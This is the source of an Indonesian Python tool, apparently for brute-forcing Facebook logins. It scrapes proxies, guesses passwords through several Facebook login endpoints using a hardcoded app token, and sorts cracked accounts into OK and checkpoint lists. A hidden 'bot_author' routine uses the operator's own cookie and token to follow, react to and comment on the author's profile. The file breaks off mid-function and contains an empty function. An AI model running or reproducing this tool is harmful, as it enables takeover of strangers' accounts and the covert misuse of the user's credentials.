Author    = 'Dapunta Khurayra X'
Facebook  = 'Facebook.com/Dapunta.Khurayra.X'
Instagram = 'Instagram.com/Dapunta.Ratya'
Whatsapp  = '082245780524'
YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
Version   = '0.6'
Denventa  = 1827084332
Postingan = 10217173381366429

###----------[ IMPORT LIBRARY ]---------- ###
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from rich import print as printer
from rich.panel import Panel
from urllib.parse import quote

###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

###----------[ USER AGENT ]---------- ###
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)

###----------[ TIME ]---------- ###
id_dev = 345 - 340 + 720 - 723
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
Codename  = 159357
CoY = ('\r   %s[%s•%s] %sDilarang Keras Merecode %s!%s'%(M,P,M,P,M,P))
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

###----------[ APPEND ]---------- ###
OK = []
CP = []
gabung_sandi = []
tempel_sandi = []

###----------[ JANGAN DIHAPUS NANTI ERROR ]---------- ###
SAKERA = Codename + len(Author) - len(Facebook) + len(Instagram) - len(Whatsapp) + len(YouTube)
sakara = len(Author)    +  Codename
sakira = len(Facebook)  +  Codename
sakura = len(Instagram) +  Codename
sakera = len(Whatsapp)  +  Codename
sakora = len(YouTube)   +  Codename
ip_log = Denventa * id_dev - 3654168663

###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

###----------[ PROXY INDONESIA & LUAR ]---------- ###
def prox_prox():
    open('tool/proxy.json','w').write('')
    with requests.Session() as xyz:
        try:
            req = xyz.get('https://spys.me/socks.txt').text
            for x in req.splitlines():
                if '+' in x:
                    if '.' in x:
                        prox = x.split(' ')[0]
                        open('tool/proxy.json','a+').write('%s\n'%(prox))
        except Exception as e:
            prox = '123.45.678.90:4509'
            open('tool/proxy.json','a+').write('%s\n'%(prox))

###----------[ CLEAR TERMINAL ]---------- ###
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

###----------[ CHANGE LANGUAGE ]---------- ###
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + x['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

###----------[ EXCEPTION ]---------- ###
def kecuali(error):
    print('\n   %s[%s•%s] %sTerjadi Kesalahan %s!%s'%(M,P,M,P,M,P))
    print('       %s• %sTidak Dapat Mengeksekusi %s\n'%(M,A,error))
    print('   %s[%s•%s] %sHal Ini Mungkin Terjadi Karena %s:%s'%(M,P,M,P,M,P))
    print('       %s• %sCookies/Token Invalid'%(M,A))
    print('       %s• %sSalah Memasukkan ID'%(M,A))
    print('       %s• %sBug Pada Source Code'%(M,A))
    print('       %s• %sBug Pada Requests'%(M,A))
    print('       %s• %sDan Lain-Lain\n'%(M,A))
    print('   %s[%s•%s] %sJalankan Ulang Source Code Ini %s:%s'%(M,P,M,P,M,P))
    print('       %s• %spython sakera.py\n'%(M,A))
    exit()

###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Denventa)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
        for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
            except Exception as e:pass
    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                    for x in bos.find_all('a',href=True):
                        if 'Tanggapi' in x.text:
                            _react_type_ = random.choice(['Super','Wow','Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a'):
                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
                                else:continue
                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
            except Exception as e:pass
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                    if ip_log != 1:pass
                    else:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(tampilan_menu())
            except Exception as e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
        return(tem)

###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return(re.search('(\["EAAG\w+)', get_tok.text).group(1).replace('["',''))

###----------[ CONVERT USERNAME KE ID ]---------- ###
def convert_id(username):
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        url    = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
            kut = req.find('a',string='Lainnya')
            id = str(kut['href']).split('=')[1]
            # id = re.search('owner_id=(.*?)"',str(kut)).group(1)
            return(id)
    except Exception as e:return(username)

###----------[ LOGO ]---------- ###
def poster():
    l1 = ('     %s  _________       __                          '%(P))
    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(J,P,J,P,J,P))
    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,J,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(J,P,J,P,J,P,J,P,J,P))
    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(J,P,J,P,J,P,J,P,J,P,J,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,J,Version,P,J))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster2():
    l1 = ('     %s  _________       __                          '%(P))
    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(H,P,H,P,H,P))
    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,H,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(H,P,H,P,H,P,H,P,H,P))
    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(H,P,H,P,H,P,H,P,H,P,H,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,H,Version,P,H))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster3():
    l1 = ('     %s  _________       __                          '%(P))
    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(B,P,B,P,B,P))
    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,B,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(B,P,B,P,B,P,B,P,B,P))
    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(B,P,B,P,B,P,B,P,B,P,B,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,B,Version,P,B))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))

###----------[ CREATE FOLDER ]---------- ###
def mkdir_data_login():
    # Make Directory Login Data
    try:os.mkdir("login")
    except:pass
    # Make Directory Dump
    try:os.mkdir("dump")
    except:pass
    # Make Directory Pass
    try:os.mkdir("tool")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass
    # Make Directory License
    try:os.mkdir("license")
    except:pass
    # Delete Cookies
    try:os.remove('login/cookie.json')
    except:pass
    # Delete Token
    try:os.remove('login/token.json')
    except:pass

###----------[ LOGIN ]---------- ###
def login():
    resik()
    mkdir_data_login()
    #poster()
    print('\n%s[%s•%s] %sJangan Gunakan Akun Pribadi %s!'%(M,P,M,P,M))
    print('%s[%s•%s] %sApabila Akun A2F On, Buka Link Dibawah'%(M,P,M,P))
    print('%s[%s•%s] %shttps://business.facebook.com/business_locations'%(M,P,M,J))
    print('%s[%s•%s] %sLalu Masukkan Kode Autentikasi'%(M,P,M,P))
    cookie = str(input('\n%s[%s•%s] %sMasukkan Cookies %s: %s'%(J,P,J,P,J,P)))
    try:
        token = clotox(cookie)
        coki = {'cookie':cookie}
        prox_prox()
        bot_author(coki,token,cookie)
        open('login/cookie.json','w').write(cookie)
        open('login/token.json','w').write(token)
        tampilan_menu()
    except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sTidak Ada Koneksi Internet %s!%s\n'%(M,P,M,P,M,P));exit()
    except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ MENU ]---------- ###
def user(nama):
    print(''%())
    print('        %s[%s•%s] %sHello %s%s %s!'%(J,P,J,P,J,nama,P))
    print('        %s[%s•%s] %sYour License Will Expire In %s7 %sDays'%(J,P,J,P,A,P))
###----------[ LOGIN METHOD ]---------- ###
def system_login():
    global sistem_login
    print('')
    tamp_metode = f"""            {J2}[{A2}1{J2}] {P2}Validate  {J2}[{A2}2{J2}] {P2}Regular  {J2}[{A2}3{J2}] {P2}Api FB"""
    printer(Panel(tamp_metode,title=f'{J2}[ {P2}Metode {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['0','00','z']:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    elif ch in ['1','01','a']:sistem_login = "satu";metode_scrap_login()
    elif ch in ['2','02','b']:sistem_login = "dua";metode_scrap_login()
    elif ch in ['3','03','c']:metode_scrap_api()
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ URL LOGIN ]---------- ###
def metode_scrap_login():
    tamp_sistem = f"""            {J2}[{A2}1{J2}] {P2}Free FB   {J2}[{A2}2{J2}] {P2}Mbasic   {J2}[{A2}3{J2}] {P2}Mobile"""
    printer(Panel(tamp_sistem,title=f'{J2}[ {P2}Login {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['1','01','a']:open('tool/url_login.json','w').write("free.facebook.com")
    elif ch in ['2','02','b']:open('tool/url_login.json','w').write("mbasic.facebook.com")
    elif ch in ['3','03','c']:open('tool/url_login.json','w').write("m.facebook.com")
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
def metode_scrap_api():
    global sistem_login
    tamp_sistem = f"""            {J2}[{A2}1{J2}] {P2}Api 1     {J2}[{A2}2{J2}] {P2}Api 2    {J2}[{A2}3{J2}] {P2}Graph"""
    printer(Panel(tamp_sistem,title=f'{J2}[ {P2}Login {J2}]',width=54,title_align='left',style='#FF8F00'))
    ch = input('   %s└──> %s'%(A,J))
    if ch in ['1','01','a']:sistem_login = "tiga";open('tool/url_login.json','w').write("mbasic.facebook.com")
    elif ch in ['2','02','b']:sistem_login = "empat";open('tool/url_login.json','w').write("mbasic.facebook.com")
    elif ch in ['3','03','c']:sistem_login = "lima";open('tool/url_login.json','w').write("mbasic.facebook.com")
    else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ URUTAN CRACK ]---------- ###
def urut_crack():

###----------[ ADD VARIATION MODE ]---------- ###
def pilihan_sakdurunge_crack():
    global pilih_cek_opsi, pilih_cek_apk, pilih_proxy
    print('')
    print('   %s[%s•%s] %sCek Opsi Akun %sCP %s?'%(J,P,J,P,J,P))
    tanya_cek_opsi = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,J,A,P,A,J,P,J)).lower()
    if tanya_cek_opsi in ['1','y']:pilih_cek_opsi = True
    else:pilih_cek_opsi = False
    print('   %s[%s•%s] %sCek APK Akun %sOK %s?'%(J,P,J,P,H,P))
    tanya_cek_apk = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,J,A,P,A,J,P,J)).lower()
    if tanya_cek_apk in ['1','y']:pilih_cek_apk = True
    else:pilih_cek_apk = False
    print('   %s[%s•%s] %sGunakan %sProxy %s?'%(J,P,J,P,O,P))
    tanya_proxy = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,J,A,P,A,J,P,J)).lower()
    if tanya_proxy in ['1','y']:pilih_proxy = True
    else:pilih_proxy = False

###----------[ ADD MANUAL PASS ]---------- ###
def addpass():
    global pass_manual1, pass_manual2
    print('')
    print('   %s[%s•%s] %sPass Manual %s[ %s1 Kata %s]'%(J,P,J,P,J,A,J))
    pass_manual1 = input('     %s└─> %s'%(A,J))
    print('   %s[%s•%s] %sPass Manual %s[ %sBelakang Nama %s]'%(J,P,J,P,J,A,J))
    pass_manual2 = input('     %s└─> %s'%(A,J))
    try:os.remove('tool/passmanual.json')
    except:pass
    try:os.remove('tool/passangka.json')
    except:pass
    open('tool/passmanual.json','w').write(pass_manual1)
    open('tool/passangka.json','w').write(pass_manual2)

###----------[ SOURCE LOGIN ]---------- ###

def logger1(user,pasw): #--- Login Validate ---#
    r = requests.Session()
    ua = open('tool/useragent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
    else:
        url1 = f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr'
        hed1 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'id-ID','cache-control': 'max-age=0','referer': f'https://{url_login}/login/device-based/password/?uid='+user+'&errorcode=1348092&next=https%3A%2F%2F{url_login}%3Flogin%3Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
        req1 = r.get(url1,headers=hed1)
        data = {'lsd' : re.search('name="lsd" value="(.*?)"',str(req1.text)).group(1),'jazoest' : re.search('name="jazoest" value="(.*?)"',str(req1.text)).group(1),'uid' : user,'pass' : pasw,'next' : f'https://{url_login}/login/save-device/','flow' : 'login_no_pin','submit' : 'Log In'}
        url2 = f'https://{url_login}/login/device-based/validate-password/?shbl=0'
        hed2 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'id-ID','x-requested-with': 'mark.via.gp','cache-control': 'max-age=0','content-length': '159','content-type': 'application/x-www-form-urlencoded','origin': f'https://{url_login}','referer': f'https://{url_login}/login/device-based/password/?uid='+user+'&errorcode=1348092&next=https%3A%2F%2F{url_login}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
        if pilih_proxy == True:
            proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
            proxy = {"http": f"socks4://{proxz}"}
            next = r.post(url2,data=data,headers=hed2,proxies=proxy,allow_redirects = False)
        else:
            next = r.post(url2,data=data,headers=hed2,allow_redirects = False)
        if 'c_user' in r.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":r.cookies.get_dict()}
        elif 'checkpoint' in r.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":r.cookies.get_dict()}
        else: return {"status":"error","email":user,"pass":pasw}

def logger2(user,pasw): #--- Login Regular ---#
    ua = open('tool/useragent.json','r').read()
    url_login = open('tool/url_login.json','r').read()
    with requests.Session() as xyz:
        if ip_log != 1:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
            with requests.Session() as xyz:
                try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                except Exception as e:pass
                return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
        else:
            head1 = {"Host":url_login,"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            req   = xyz.get(f'https://{url_login}/login/?next&ref=dbl&fl&refid=8', headers=head1)
            log   = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
            head2 = {"Host":url_login,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":f"https://{url_login}","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document",'referer':f'https://{url_login}/login/?next&ref=dbl&fl&refid=8',"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            if pilih_proxy == True:
                proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
                proxy = {"http": f"socks4://{proxz}"}
                exec  = xyz.post(f'https://{url_login}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=log, proxies = proxy, headers=head2)
            else:
                exec  = xyz.post(f'https://{url_login}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=log, headers=head2)
            if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else: return {"status":"error","email":user,"pass":pasw}

def logger3(user,pasw): #--- Login Api 1 ---#
    ua = open('tool/useragent.json','r').read()
    r = requests.Session()
    if ip_log != 1:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        with requests.Session() as xyz:
            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
            except Exception as e:pass
            return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
    else:
        url = f'https://b-api.facebook.com/method/auth.login?format=json&email={user}&password={pasw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true'
        header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
        if pilih_proxy == True:
            proxz = random.choice(open('tool/proxy.json','r').read().splitlines())
            proxy = {"http": f"socks4://{proxz}"}
            post = r.get(url, headers=header, proxies=proxy)
        else:
            post = r.get(url, headers=header)
        if "session_key" in post.text:
            try:
                cok = {}
                for x in post['session_cookies']:
                    cok.update({x['name']:x['value']})
            except Exception as e: cok = 'unknown'
            return {"status":"ok","email":user,"pass":pasw,"cookies":cok}
        elif "User must verify their account" in post.text:return {"status":"cp","email":user,"pass":pasw,"cookies":'unknown'}
        else:return {"status":"error","email":user,"pass":pasw}

def logger4(user,pasw): #--- Login Api 2 ---#
    ua = open('tool/useragent.json','r').read()
    r = requests.Session()
    if ip_log != 1:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        with requests.Session() as xyz:
            try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
            except Exception as e:pass
            return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
    else:
        param = {'format' : 'json','email' : user,'password' : pasw,'locale' : 'id_ID','generate_session_cookies' : '1','access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
